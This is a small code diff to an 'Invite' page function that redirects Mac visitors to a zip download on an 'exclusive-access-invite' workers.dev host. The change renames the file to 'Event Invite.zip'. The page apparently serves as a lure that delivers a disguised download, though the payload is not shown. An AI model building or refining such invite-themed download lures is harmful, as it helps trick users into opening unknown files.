@@ -34,7 +34,7 @@ function Invite() {
     } else
     {
       // Replace with your Mac download URL
-      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Contents.zip';
+      window.location.href = 'https://exclusive-access-invite.hemin.workers.dev/Event Invite.zip';
     }
   };
 
